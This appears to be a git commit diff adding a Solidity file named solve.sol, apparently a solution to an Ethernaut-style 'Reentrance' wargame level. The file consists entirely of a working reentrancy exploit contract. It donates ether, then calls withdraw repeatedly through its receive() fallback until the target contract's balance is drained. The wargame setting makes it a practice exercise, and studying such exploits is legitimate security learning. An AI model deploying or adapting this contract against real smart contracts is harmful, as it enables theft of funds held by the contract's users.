d094aca24f74bdd1877b4dc5a47c2695bc47463e
donghyeon <tsvz1234@gmail.com>
2024-07-08 02:41:50 +0900

    Update solve.sol

--- Reentrance/solve.sol
+++ Reentrance/solve.sol
@@ -1,1 +1,31 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
 
+import "./Lock.sol";
+
+
+contract Attack {
+    Reentrance public reentrance;
+    constructor (address  _address) {
+        address payable target = payable(_address);
+        reentrance = Reentrance(target);
+    }
+
+    function drawall() public payable {
+        reentrance.donate{value: msg.value}(address(this));
+        reentrance.withdraw(1 ether);
+
+    }
+
+    function bomb() public payable {
+        reentrance.donate{value: msg.value}(address(this));
+        reentrance.withdraw(address(reentrance).balance);
+    }
+
+    receive() external payable {
+
+        if(address(reentrance).balance !=0){
+            reentrance.withdraw(0.001 ether);
+        }
+    }
+}
